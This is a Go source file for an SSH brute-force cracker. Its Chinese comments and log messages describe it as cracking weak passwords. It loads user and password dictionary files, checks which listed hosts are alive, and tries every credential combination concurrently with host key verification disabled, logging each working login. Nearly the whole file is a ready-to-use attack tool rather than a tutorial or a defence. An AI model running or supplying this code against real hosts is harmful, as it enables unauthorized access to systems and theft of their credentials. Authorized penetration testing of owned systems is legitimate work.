package ssh

import (
	"fmt"
	"log"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

func sshLogin(ip, username, password string) (bool, error) {
	success := false
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		Timeout:         3 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	client, err := ssh.Dial("tcp", fmt.Sprintf("%v:%v", ip, 22), config)
	if err == nil {
		defer client.Close()
		session, err := client.NewSession()
		// errRet := session.Run("crontab -l")
		errRet := session.Run("echo do a test")
		if err == nil && errRet == nil {
			defer session.Close()
			success = true
		}
	}
	return success, err
}

type Task struct {
	ip       string
	user     string
	password string
}

func runTask(tasks []Task) {
	var wg sync.WaitGroup
	for _, task := range tasks {
		wg.Add(1)
		go func(task Task) {
			defer wg.Done()
			success, _ := sshLogin(task.ip, task.user, task.password)
			if success {
				log.Printf("破解%v成功，用户名是%v,密码是%v\n", task.ip, task.user, task.password)
			}
		}(task)
	}
	wg.Wait()
}

func runTaskInCount(tasks []Task, threads int) {
	var wg sync.WaitGroup
	taskCh := make(chan Task, threads*2)
	for i := 0; i < threads; i++ {
		go func() {
			for task := range taskCh {
				success, _ := sshLogin(task.ip, task.user, task.password)
				if success {
					log.Printf("破解%v成功，用户名是%v,密码是%v\n", task.ip, task.user, task.password)
				}
				defer wg.Done()
			}
		}()
	}
	for _, task := range tasks {
		wg.Add(1)
		taskCh <- task
	}
	wg.Wait()
	close(taskCh)
}

func serialExec(users []string, passwords []string, aliveIps []string) {
	// 爆破
	for _, user := range users {
		for _, password := range passwords {
			for _, ip := range aliveIps {
				success, _ := sshLogin(ip, user, password)
				log.Println(ip, user, password, success)
				if success {
					log.Printf("破解%v成功，用户名是%v,密码是%v\n", ip, user, password)
				}
			}
		}
	}
}

func main() {
	//带破解的主机列表
	ips := []string{"10.0.0.1", "10.0.0.4", "10.0.0.8"}
	//主机是否存活检查
	var aliveIps []string
	for _, ip := range ips {
		if checkAlive(ip) {
			aliveIps = append(aliveIps, ip)
		}
	}
	//读取弱口令字典
	users, err := readDictFile("user.dic")
	if err != nil {
		log.Fatalln("读取用户名字典文件错误：", err)
	}
	passwords, err := readDictFile("pass.dic")
	if err != nil {
		log.Fatalln("读取密码字典文件错误：", err)
	}

	//爆破
	var tasks []Task
	for _, user := range users {
		for _, password := range passwords {
			for _, ip := range aliveIps {
				tasks = append(tasks, Task{ip, user, password})
			}
		}
	}
	runTask(tasks)
}
